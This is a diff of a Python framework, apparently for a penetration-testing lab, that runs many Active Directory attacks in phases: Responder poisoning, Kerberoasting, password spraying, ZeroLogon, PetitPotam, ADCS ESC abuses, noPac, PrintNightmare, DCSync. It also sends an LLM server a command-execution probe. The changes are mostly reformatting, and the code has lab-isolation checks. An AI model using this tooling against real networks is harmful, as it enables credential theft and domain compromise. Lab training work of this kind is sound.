@@ -64,8 +64,10 @@ __author__ = "Miguel A. Carlo"
 # Constants & Enums
 # ============================================================================
 
+
 class Phase(Enum):
     """Execution phases for attack orchestration."""
+
     RECON = "recon"
     CREDENTIAL_ATTACKS = "credential_attacks"
     EXPLOITATION = "exploitation"
@@ -86,9 +88,11 @@ TIMEOUT_EXTENDED = 300
 # Data Models
 # ============================================================================
 
+
 @dataclass
 class AttackResult:
     """Immutable record of a single attack execution."""
+
     attack_name: str
     phase: str
     success: bool
@@ -109,6 +113,7 @@ class AttackResult:
 @dataclass
 class LabConfig:
     """Lab topology and credentials."""
+
     dc_ip: str
     kali_ip: str
     win10_ip: str
@@ -162,7 +167,8 @@ class LabConfig:
             service_accounts=data.get("service_accounts", []),
             expected_subnet=data.get("expected_subnet", "172.28.128.0/24"),
             expected_hostname_pattern=data.get(
-                "expected_hostname_pattern", r"^(dc01|kali|win10|db01|ca01-esc|exch01|sp01|print01|pnpt-internal|llm01|cloud-pentest)$"
+                "expected_hostname_pattern",
+                r"^(dc01|kali|win10|db01|ca01-esc|exch01|sp01|print01|pnpt-internal|llm01|cloud-pentest)$",
             ),
             responder_interface=data.get("responder_interface", "eth0"),
             ca_name=data.get("ca_name", "LAB-ESC-CA"),
@@ -195,9 +201,11 @@ class LabConfig:
 # Plugin Registry
 # ============================================================================
 
+
 @dataclass(frozen=True)
 class AttackDescriptor:
     """Metadata for a registered attack module."""
+
     func: Callable[..., Awaitable[AttackResult]]
     phase: str
     name: str
@@ -317,7 +325,9 @@ def sanitize_command(argv: List[str]) -> str:
         if ":" in arg and any(kw in arg.lower() for kw in ("user", "pass", "cred")):
             parts = arg.split(":", 1)
             sanitized.append(f"{parts[0]}:[REDACTED]")
-        elif arg.startswith("-") and i + 1 < len(argv) and any(kw in arg.lower() for kw in ("-p", "-password", "--pass")):
+        elif (
+            arg.startswith("-") and i + 1 < len(argv) and any(kw in arg.lower() for kw in ("-p", "-password", "--pass"))
+        ):
             sanitized.append(arg)
             skip_next = True
         else:
@@ -329,8 +339,8 @@ def sanitize_command(argv: List[str]) -> str:
 # Utility: Temp File Management
 # ============================================================================
 
-class TempFileManager:
 
+class TempFileManager:
     """Manage temporary files with automatic cleanup."""
 
     def __init__(self):
@@ -374,6 +384,7 @@ class TempFileManager:
 # ============================================================================
 # Tool Output Parsers
 # ============================================================================
+
 
 def parse_certipy_output(output: str) -> bool:
     """Parse Certipy output for success indicators."""
@@ -427,6 +438,7 @@ def parse_responder_output(output: str) -> bool:
 # ============================================================================
 # Main Automation Class
 # ============================================================================
+
 
 class LabAttackAutomation:
     """Plugin-based AD attack orchestration framework."""
@@ -525,9 +537,14 @@ class LabAttackAutomation:
                     "robert.cio": "CHANGE_ME",
                 },
                 "service_accounts": [
-                    "svc_asrep", "svc_kerberoast", "svc_delegate",
-                    "svc_sql", "svc_exchange", "svc_sharepoint",
-                    "svc_backup", "svc_join",
+                    "svc_asrep",
+                    "svc_kerberoast",
+                    "svc_delegate",
+                    "svc_sql",
+                    "svc_exchange",
+                    "svc_sharepoint",
+                    "svc_backup",
+                    "svc_join",
                 ],
                 "ca_name": "LAB-ESC-CA",
                 "esc1_template": "VulnESC1",
@@ -540,9 +557,7 @@ class LabAttackAutomation:
 
         # Override credentials from environment variables if present
         for username in list(data.get("users", {}).keys()):
-            env_key = (
-                f"LAB_CRED_{username.upper().replace('.', '_').replace('-', '_')}"
-            )
+            env_key = f"LAB_CRED_{username.upper().replace('.', '_').replace('-', '_')}"
             env_val = os.environ.get(env_key)
             if env_val:
                 data.setdefault("users", {})[username] = env_val
@@ -553,9 +568,7 @@ class LabAttackAutomation:
         """Return credential or raise with a clear message."""
         pw = self.config.users.get(username)
         if not pw or pw in ("CHANGE_ME", "your_password_here"):
-            env_key = (
-                f"LAB_CRED_{username.upper().replace('.', '_').replace('-', '_')}"
-            )
+            env_key = f"LAB_CRED_{username.upper().replace('.', '_').replace('-', '_')}"
             raise ValueError(
                 f"Credential for '{username}' is not configured. "
                 f"Set environment variable {env_key} or provide in config."
@@ -594,9 +607,7 @@ class LabAttackAutomation:
 
     def _install_signal_handlers(self) -> None:
         def _handler(signum: int, _frame: Any) -> None:
-            self.log.warning(
-                "Signal %s received — requesting graceful shutdown", signum
-            )
+            self.log.warning("Signal %s received — requesting graceful shutdown", signum)
             self._shutdown_requested = True
 
         # Use loop.add_signal_handler for asyncio compatibility
@@ -703,7 +714,9 @@ class LabAttackAutomation:
             if addr not in expected_net:
                 self.log.error(
                     "Host %s (%s) is outside expected subnet %s",
-                    name, ip, self.config.expected_subnet,
+                    name,
+                    ip,
+                    self.config.expected_subnet,
                 )
                 return False
 
@@ -716,18 +729,14 @@ class LabAttackAutomation:
 
         async def _tcp_check(name: str, ip: str, port: int) -> Tuple[str, bool]:
             try:
-                _, writer = await asyncio.wait_for(
-                    asyncio.open_connection(ip, port), timeout=5
-                )
+                _, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=5)
                 writer.close()
                 await writer.wait_closed()
                 return name, True
             except Exception:
                 return name, False
 
-        results = dict(
-            await asyncio.gather(*[_tcp_check(n, ip, p) for n, ip, p in tcp_checks])
-        )
+        results = dict(await asyncio.gather(*[_tcp_check(n, ip, p) for n, ip, p in tcp_checks]))
 
         # DC must be reachable
         if not results.get("dc"):
@@ -750,10 +759,7 @@ class LabAttackAutomation:
                 self.log.error("Lab confirmation token mismatch")
                 return False
         elif env_token or self.lab_confirm_token:
-            self.log.warning(
-                "Partial token configuration — set both LAB_ATTACK_TOKEN env "
-                "and --lab-confirm flag"
-            )
+            self.log.warning("Partial token configuration — set both LAB_ATTACK_TOKEN env " "and --lab-confirm flag")
 
         self.log.info(
             "Lab isolation verified: subnet %s, %d hosts reachable via TCP",
@@ -762,9 +768,7 @@ class LabAttackAutomation:
         )
 
         if self.safe_mode:
-            self.log.warning(
-                "SAFE MODE enabled — destructive exploits will be skipped"
-            )
+            self.log.warning("SAFE MODE enabled — destructive exploits will be skipped")
         return True
 
     # ------------------------------------------------------------------------
@@ -790,9 +794,7 @@ class LabAttackAutomation:
             )
             self._child_processes.append(proc)
 
-            stdout, stderr = await asyncio.wait_for(
-                proc.communicate(), timeout=timeout
-            )
+            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
             output = {
                 "stdout": stdout.decode(errors="replace"),
                 "stderr": stderr.decode(errors="replace"),
@@ -809,12 +811,8 @@ class LabAttackAutomation:
         except FileNotFoundError as exc:
             return False, {"stdout": "", "stderr": f"Binary not found: {exc}"}, time.monotonic() - t0
         except Exception as exc:
-            self.log.exception(
-                "Unexpected error running %s", argv[0] if argv else "<empty>"
-            )
-            return (
-                False, {"stdout": "", "stderr": str(exc)}, time.monotonic() - t0
-            )
+            self.log.exception("Unexpected error running %s", argv[0] if argv else "<empty>")
+            return (False, {"stdout": "", "stderr": str(exc)}, time.monotonic() - t0)
         finally:
             if proc is not None and proc in self._child_processes:
                 self._child_processes.remove(proc)
@@ -876,7 +874,7 @@ class LabAttackAutomation:
                 # Server error — retry
                 if 500 <= status < 600 and attempt < retries:
                     jitter = random.uniform(0, max_jitter)
-                    delay = backoff * (2 ** attempt) + jitter
+                    delay = backoff * (2**attempt) + jitter
                     self.log.debug(
                         "HTTP %s %s -> %s (attempt %d/%d), retrying in %.2fs",
                         method,
@@ -894,7 +892,7 @@ class LabAttackAutomation:
                 last_exc = exc
                 if attempt < retries:
                     jitter = random.uniform(0, max_jitter)
-                    delay = backoff * (2 ** attempt) + jitter
+                    delay = backoff * (2**attempt) + jitter
                     self.log.debug(
                         "HTTP %s %s -> %s (attempt %d/%d), retrying in %.2fs",
                         method,
@@ -959,11 +957,7 @@ class LabAttackAutomation:
         )
         self.results.append(result)
 
-        tag = (
-            f"{Fore.GREEN}[PASS]{Style.RESET_ALL}"
-            if success
-            else f"{Fore.RED}[FAIL]{Style.RESET_ALL}"
-        )
+        tag = f"{Fore.GREEN}[PASS]{Style.RESET_ALL}" if success else f"{Fore.RED}[FAIL]{Style.RESET_ALL}"
         self.log.info("%s %-40s (%.2fs)", tag, name, duration)
         return result
 
@@ -1015,7 +1009,8 @@ class LabAttackAutomation:
                 "Missing dependencies",
                 {},
                 0.0,
-                error="missing_dependencies", error_type="DependencyError",
+                error="missing_dependencies",
+                error_type="DependencyError",
             )
 
         try:
@@ -1080,10 +1075,7 @@ class LabAttackAutomation:
             ok = success_check(combined_output)
         elif ok:
             # Default success check - look for common success indicators
-            ok = any(
-                indicator in combined_output.lower()
-                for indicator in ["success", "completed", "done"]
-            )
+            ok = any(indicator in combined_output.lower() for indicator in ["success", "completed", "done"])
 
         metadata = {
             self.META_TOOL: tool_name or argv[0] if argv else "unknown",
@@ -1130,7 +1122,10 @@ class LabAttackAutomation:
         proc: Optional[asyncio.subprocess.Process] = None
         try:
             proc = await asyncio.create_subprocess_exec(
-                "responder", "-I", self.config.responder_interface, "-rdwF",
+                "responder",
+                "-I",
+                self.config.responder_interface,
+                "-rdwF",
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
             )
@@ -1156,16 +1151,14 @@ class LabAttackAutomation:
                 if check_hashes:
                     ok = parse_responder_output(combined_output)
                     if ok:
-                        combined_output = (
-                            "LLMNR/NBT-NS poisoning successful - NTLM hashes captured"
-                        )
+                        combined_output = "LLMNR/NBT-NS poisoning successful - NTLM hashes captured"
                     else:
-                        combined_output = "Responder ran but no hashes captured (target may not be requesting)"  # noqa: E501
+                        combined_output = (
+                            "Responder ran but no hashes captured (target may not be requesting)"  # noqa: E501
+                        )
                 else:
                     ok = running
-                    combined_output = (
-                        f"Responder bound successfully (smoke test - ran for {duration}s)"
-                    )
+                    combined_output = f"Responder bound successfully (smoke test - ran for {duration}s)"
             else:
                 stdout = await proc.stdout.read()
                 stderr = await proc.stderr.read()
@@ -1174,9 +1167,7 @@ class LabAttackAutomation:
 
             metadata = {
                 self.META_TOOL: "responder",
-                self.META_COMMAND: (
-                    f"responder -I {self.config.responder_interface} -rdwF"
-                ),
+                self.META_COMMAND: (f"responder -I {self.config.responder_interface} -rdwF"),
                 self.META_TARGET: self.config.dc_ip,
                 self.META_HOST_ROLE: "attacker_machine",
                 "duration_seconds": duration,
@@ -1242,9 +1233,7 @@ class LabAttackAutomation:
             self.META_TARGET: self.config.dc_ip,
             self.META_HOST_ROLE: "domain_controller",
         }
-        return self._record(
-            "AS-REP Roasting", Phase.RECON.value, ok, combined_output, metadata, dur
-        )
+        return self._record("AS-REP Roasting", Phase.RECON.value, ok, combined_output, metadata, dur)
 
     @attack(
         phase=Phase.CREDENTIAL_ATTACKS.value,
@@ -1283,11 +1272,7 @@ class LabAttackAutomation:
             self.META_TARGET: self.config.dc_ip,
             self.META_HOST_ROLE: "domain_controller",
         }
-        return self._record(
-            "Kerberoasting",
-            Phase.CREDENTIAL_ATTACKS.value,
-            ok, combined_output, metadata, dur
-        )
+        return self._record("Kerberoasting", Phase.CREDENTIAL_ATTACKS.value, ok, combined_output, metadata, dur)
 
     @attack(
         phase=Phase.CREDENTIAL_ATTACKS.value,
@@ -1310,10 +1295,7 @@ class LabAttackAutomation:
         combined_output = output["stdout"] + output["stderr"]
 
         if ok:
-            ok = any(
-                k in combined_output.lower()
-                for k in ("password", "cpassword", "user")
-            )
+            ok = any(k in combined_output.lower() for k in ("password", "cpassword", "user"))
 
         metadata = {
             self.META_TOOL: "impacket-Get-GPPPassword",
@@ -1321,8 +1303,9 @@ class LabAttackAutomation:
             self.META_TARGET: self.config.dc_ip,
             self.META_HOST_ROLE: "domain_controller",
         }
-        return self._record("GPP Password Extraction", Phase.CREDENTIAL_ATTACKS.value,
-                           ok, combined_output, metadata, dur)  # noqa: E131
+        return self._record(
+            "GPP Password Extraction", Phase.CREDENTIAL_ATTACKS.value, ok, combined_output, metadata, dur
+        )  # noqa: E131
 
     @attack(
         phase=Phase.CREDENTIAL_ATTACKS.value,
@@ -1337,11 +1320,7 @@ class LabAttackAutomation:
         it can bind to the interface. It is NOT sufficient time to capture hashes
         in a real attack. For actual hash capture, run Responder separately.
         """
-        return await self._run_responder(
-            "SMB Relay",
-            Phase.CREDENTIAL_ATTACKS.value,
-            duration=5, check_hashes=False
-        )
+        return await self._run_responder("SMB Relay", Phase.CREDENTIAL_ATTACKS.value, duration=5, check_hashes=False)
 
     @attack(
         phase=Phase.CREDENTIAL_ATTACKS.value,
@@ -1353,8 +1332,14 @@ class LabAttackAutomation:
         """Password spraying attack using crackmapexec."""
         # Common weak passwords to test
         passwords = [
-            "Password123!", "P@ssw0rd", "Winter2024!", "Summer2024!", "Qwerty123!",
-            "Admin123!", "Welcome1!", "Changeme!",
+            "Password123!",
+            "P@ssw0rd",
+            "Winter2024!",
+            "Summer2024!",
+            "Qwerty123!",
+            "Admin123!",
+            "Welcome1!",
+            "Changeme!",
         ]
 
         # Create a users file from configured users
@@ -1396,8 +1381,9 @@ class LabAttackAutomation:
             self.META_HOST_ROLE: "domain_controller",
             "passwords_tested": len(passwords),
         }
-        return self._record("Password Spraying", Phase.CREDENTIAL_ATTACKS.value,
-                           spray_success, output_text, metadata, 0.0)  # noqa: E131
+        return self._record(
+            "Password Spraying", Phase.CREDENTIAL_ATTACKS.value, spray_success, output_text, metadata, 0.0
+        )  # noqa: E131
 
     @attack(
         phase=Phase.EXPLOITATION.value,
@@ -1418,10 +1404,7 @@ class LabAttackAutomation:
         combined_output = output["stdout"] + output["stderr"]
 
         if ok:
-            ok = any(
-                k in combined_output.lower()
-                for k in ("success", "exploit worked", "password set to empty")
-            )
+            ok = any(k in combined_output.lower() for k in ("success", "exploit worked", "password set to empty"))
 
         metadata = {
             self.META_TOOL: "impacket-cve-2020-1472",
@@ -1429,9 +1412,7 @@ class LabAttackAutomation:
             self.META_TARGET: self.config.dc_ip,
             self.META_HOST_ROLE: "domain_controller",
         }
-        return self._record(
-            "ZeroLogon", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur
-        )
+        return self._record("ZeroLogon", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)
 
     @attack(
         phase=Phase.EXPLOITATION.value,
@@ -1451,9 +1432,7 @@ class LabAttackAutomation:
         combined_output = output["stdout"] + output["stderr"]
 
         if ok:
-            ok = any(
-                k in combined_output.lower() for k in ("rpc_bind", "success", "pipe connected")
-            )
+            ok = any(k in combined_output.lower() for k in ("rpc_bind", "success", "pipe connected"))
 
         metadata = {
             self.META_TOOL: "PetitPotam.py",
@@ -1461,9 +1440,7 @@ class LabAttackAutomation:
             self.META_TARGET: self.config.dc_ip,
             self.META_HOST_ROLE: "domain_controller",
         }
-        return self._record(
-            "PetitPotam", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur
-        )
+        return self._record("PetitPotam", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)
 
     @attack(
         phase=Phase.EXPLOITATION.value,
@@ -1505,9 +1482,7 @@ class LabAttackAutomation:
             self.META_TARGET: self.config.ca01_esc_ip,
             self.META_HOST_ROLE: "certificate_authority",
         }
-        return self._record(
-            "ADCS ESC1", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur
-        )
+        return self._record("ADCS ESC1", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)
 
     @attack(
         phase=Phase.EXPLOITATION.value,
@@ -1547,9 +1522,7 @@ class LabAttackAutomation:
             self.META_TARGET: self.config.ca01_esc_ip,
             self.META_HOST_ROLE: "certificate_authority",
         }
-        return self._record(
-            "ADCS ESC4", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur
-        )
+        return self._record("ADCS ESC4", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)
 
     @attack(
         phase=Phase.EXPLOITATION.value,
@@ -1606,9 +1579,7 @@ class LabAttackAutomation:
             self.META_TARGET: self.config.ca01_esc_ip,
             self.META_HOST_ROLE: "certificate_authority",
         }
-        return self._record(
-            "ADCS ESC7", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur
-        )
+        return self._record("ADCS ESC7", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)
 
     @attack(
         phase=Phase.EXPLOITATION.value,
@@ -1642,9 +1613,7 @@ class LabAttackAutomation:
             self.META_TARGET: self.config.ca01_esc_ip,
             self.META_HOST_ROLE: "certificate_authority",
         }
-        return self._record(
-            "ADCS ESC8", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur
-        )
+        return self._record("ADCS ESC8", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)
 
     @attack(
         phase=Phase.EXPLOITATION.value,
@@ -1678,9 +1647,7 @@ class LabAttackAutomation:
             self.META_TARGET: self.config.ca01_esc_ip,
             self.META_HOST_ROLE: "certificate_authority",
         }
-        return self._record(
-            "ADCS ESC9", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur
-        )
+        return self._record("ADCS ESC9", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)
 
     @attack(
         phase=Phase.EXPLOITATION.value,
@@ -1708,10 +1675,7 @@ class LabAttackAutomation:
         combined_output = output["stdout"] + output["stderr"]
 
         if ok:
-            ok = any(
-                k in combined_output.lower()
-                for k in ("added", "msds-keycredentiallink", "success")
-            )
+            ok = any(k in combined_output.lower() for k in ("added", "msds-keycredentiallink", "success"))
 
         metadata = {
             self.META_TOOL: "whisker.py",
@@ -1743,10 +1707,7 @@ class LabAttackAutomation:
         combined_output = output["stdout"] + output["stderr"]
 
         if ok:
-            ok = any(
-                k in combined_output.lower()
-                for k in ("shell", "administrator", "ticket", "success")
-            )
+            ok = any(k in combined_output.lower() for k in ("shell", "administrator", "ticket", "success"))
 
         metadata = {
             self.META_TOOL: "noPac.py",
@@ -1780,10 +1741,7 @@ class LabAttackAutomation:
 
         if ok:
             ok = any(
-                k in combined_output.lower()
-                for k in (
-                    "success", "msds-allowedtoactonbehalfofotheridentity", "written"
-                )
+                k in combined_output.lower() for k in ("success", "msds-allowedtoactonbehalfofotheridentity", "written")
             )
 
         metadata = {
@@ -1814,9 +1772,7 @@ class LabAttackAutomation:
         combined_output = output["stdout"] + output["stderr"]
 
         if ok:
-            ok = any(
-                k in combined_output.lower() for k in ("success", "completed", "driver loaded")
-            )
+            ok = any(k in combined_output.lower() for k in ("success", "completed", "driver loaded"))
 
         metadata = {
             self.META_TOOL: "CVE-2021-1675.py",
@@ -1849,10 +1805,7 @@ class LabAttackAutomation:
         combined_output = output["stdout"] + output["stderr"]
 
         if ok:
-            ok = any(
-                k in combined_output.lower()
-                for k in ("output", "lab", "administrator", "svc_sql")
-            )
+            ok = any(k in combined_output.lower() for k in ("output", "lab", "administrator", "svc_sql"))
 
         metadata = {
             self.META_TOOL: "mssqlclient.py",
@@ -1894,8 +1847,9 @@ class LabAttackAutomation:
             self.META_TARGET: self.config.dc_ip,
             self.META_HOST_ROLE: "domain_controller",
         }
-        return self._record("Lateral Movement", Phase.PRIVILEGE_ESCALATION.value,
-                           ok, combined_output, metadata, dur)  # noqa: E131
+        return self._record(
+            "Lateral Movement", Phase.PRIVILEGE_ESCALATION.value, ok, combined_output, metadata, dur
+        )  # noqa: E131
 
     @attack(
         phase=Phase.PRIVILEGE_ESCALATION.value,
@@ -1924,9 +1878,7 @@ class LabAttackAutomation:
             self.META_TARGET: self.config.dc_ip,
             self.META_HOST_ROLE: "domain_controller",
         }
-        return self._record(
-            "DCSync", Phase.PRIVILEGE_ESCALATION.value, ok, combined_output, metadata, dur
-        )
+        return self._record("DCSync", Phase.PRIVILEGE_ESCALATION.value, ok, combined_output, metadata, dur)
 
     @attack(
         phase=Phase.PRIVILEGE_ESCALATION.value,
@@ -1972,8 +1924,9 @@ class LabAttackAutomation:
             self.META_TARGET: self.config.dc_ip,
             self.META_HOST_ROLE: "domain_controller",
         }
-        return self._record("BloodHound Collection", Phase.PRIVILEGE_ESCALATION.value,
-                           ok, combined_output, metadata, dur)  # noqa: E131
+        return self._record(
+            "BloodHound Collection", Phase.PRIVILEGE_ESCALATION.value, ok, combined_output, metadata, dur
+        )  # noqa: E131
 
     @attack(
         phase=Phase.PRIVILEGE_ESCALATION.value,
@@ -1985,9 +1938,7 @@ class LabAttackAutomation:
     async def llmnr_poisoning(self) -> AttackResult:
         """Full LLMNR/NBT-NS poisoning attack with Responder."""
         return await self._run_responder(  # noqa: R505
-            "LLMNR/NBT-NS Poisoning",
-            Phase.PRIVILEGE_ESCALATION.value,
-            duration=30, check_hashes=True
+            "LLMNR/NBT-NS Poisoning", Phase.PRIVILEGE_ESCALATION.value, duration=30, check_hashes=True
         )
 
     @attack(
@@ -2003,10 +1954,7 @@ class LabAttackAutomation:
             (
                 "POST",
                 "/v7/execute-plugin",
-                {
-                    "plugin_name": "command_executor",
-                    "params": {"cmd": "id"}
-                },
+                {"plugin_name": "command_executor", "params": {"cmd": "id"}},
             ),
             ("GET", "/v6/debug", None),
             ("GET", "/v10/model-info", None),
@@ -2019,9 +1967,7 @@ class LabAttackAutomation:
         for method, path, payload in tests:
             url = f"{base}{path}"
             try:
-                status, text = await self._http_request(
-                    method, url, json_payload=payload
-                )
+                status, text = await self._http_request(method, url, json_payload=payload)
                 lines.append(f"  {method} {path} -> {status}: {text[:200]}")
                 if 200 <= status < 300:
                     hits += 1
@@ -2037,8 +1983,9 @@ class LabAttackAutomation:
             self.META_HOST_ROLE: "llm_server",
             "endpoints_hit": hits,
         }
-        return self._record("LLM Vulnerability Tests", Phase.CLOUD_LLM.value,
-                            hits > 0, output, metadata, dur)  # noqa: E131
+        return self._record(
+            "LLM Vulnerability Tests", Phase.CLOUD_LLM.value, hits > 0, output, metadata, dur
+        )  # noqa: E131
 
     @attack(
         phase=Phase.CLOUD_LLM.value,
@@ -2103,8 +2050,7 @@ class LabAttackAutomation:
             self.META_HOST_ROLE: "cloud_simulator",
             "findings": hits,
         }
-        return self._record("Cloud Enumeration", Phase.CLOUD_LLM.value,
-                            hits > 0, output, metadata, dur)  # noqa: E131
+        return self._record("Cloud Enumeration", Phase.CLOUD_LLM.value, hits > 0, output, metadata, dur)  # noqa: E131
 
     # ========================================================================
     # Orchestrator (phased execution)
@@ -2178,11 +2124,7 @@ class LabAttackAutomation:
 
         for r in self.results:
             if colors:
-                tag = (
-                    f"{Fore.GREEN}[PASS]{Style.RESET_ALL}"
-                    if r.success
-                    else f"{Fore.RED}[FAIL]{Style.RESET_ALL}"
-                )
+                tag = f"{Fore.GREEN}[PASS]{Style.RESET_ALL}" if r.success else f"{Fore.RED}[FAIL]{Style.RESET_ALL}"
             else:
                 tag = "[PASS]" if r.success else "[FAIL]"
 
@@ -2242,6 +2184,7 @@ class LabAttackAutomation:
 # CLI
 # ============================================================================
 
+
 async def main() -> int:
     """CLI entry point."""
     parser = argparse.ArgumentParser(
@@ -2274,30 +2217,16 @@ Examples:
   python3 lab_attack_automation.py --list-attacks
         """,
     )
-    parser.add_argument(
-        "-c", "--config", help="Path to JSON config file"
-    )
-    parser.add_argument(
-        "-r", "--report", action="store_true", help="Save TXT + JSON reports after execution"
-    )
-    parser.add_argument(
-        "-t", "--target", help="Run a single attack by name"
-    )
-    parser.add_argument(
-        "-p", "--phases", nargs="+", help="Run only specific phases"
-    )
+    parser.add_argument("-c", "--config", help="Path to JSON config file")
+    parser.add_argument("-r", "--report", action="store_true", help="Save TXT + JSON reports after execution")
+    parser.add_argument("-t", "--target", help="Run a single attack by name")
+    parser.add_argument("-p", "--phases", nargs="+", help="Run only specific phases")
     parser.add_argument(
         "--no-safe-mode", action="store_true", help="Allow destructive exploits (ZeroLogon, NoPac, etc.)"
     )
-    parser.add_argument(
-        "--lab-confirm", help="Lab confirmation token (must match LAB_ATTACK_TOKEN env)"
-    )
-    parser.add_argument(
-        "-v", "--verbose", action="store_true"
-    )
-    parser.add_argument(
-        "--list-attacks", action="store_true", help="List registered attacks and exit"
-    )
+    parser.add_argument("--lab-confirm", help="Lab confirmation token (must match LAB_ATTACK_TOKEN env)")
+    parser.add_argument("-v", "--verbose", action="store_true")
+    parser.add_argument("--list-attacks", action="store_true", help="List registered attacks and exit")
     args = parser.parse_args()
 
     if args.verbose:
@@ -2338,18 +2267,14 @@ Examples:
 
         async def _quick_check(ip: str, port: int) -> bool:
             try:
-                _, writer = await asyncio.wait_for(
-                    asyncio.open_connection(ip, port), timeout=5
-                )
+                _, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=5)
                 writer.close()
                 await writer.wait_closed()
                 return True
             except Exception:
                 return False
 
-        results = await asyncio.gather(
-            *[_quick_check(ip, p) for ip, p in tcp_checks]
-        )
+        results = await asyncio.gather(*[_quick_check(ip, p) for ip, p in tcp_checks])
         if not all(results):
             print(f"{Fore.RED}Critical systems unreachable — aborting{Style.RESET_ALL}")
             return 1
